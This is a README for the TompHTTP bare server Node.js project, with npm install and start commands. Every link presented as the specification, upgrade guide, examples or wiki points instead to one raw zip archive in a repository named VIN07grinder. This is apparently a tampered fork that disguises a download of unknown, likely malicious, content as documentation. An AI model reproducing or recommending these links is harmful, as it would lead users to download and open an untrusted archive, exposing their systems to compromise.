# TOMP Bare Server

This repository implements the TompHTTP bare server. See the specification [here](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).

## Upgrading

A guide for updating from v1 to v2 can be found [here](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).

## Usage

We provide a command-line interface for creating a server.

For more features, specify the `--help` option when running the CLI.

## Quickstart

1. Install Bare Server Node globally

```sh
npm install --global @tomphttp/bare-server-node
```

2. Start the server

```sh
npx bare-server-node
```

Optionally start the server localhost:8080:

```sh
npx bare-server-node --port 8080 --host localhost
```

## Programically create a bare server

See [examples/](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).

## Development

See the [wiki](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).
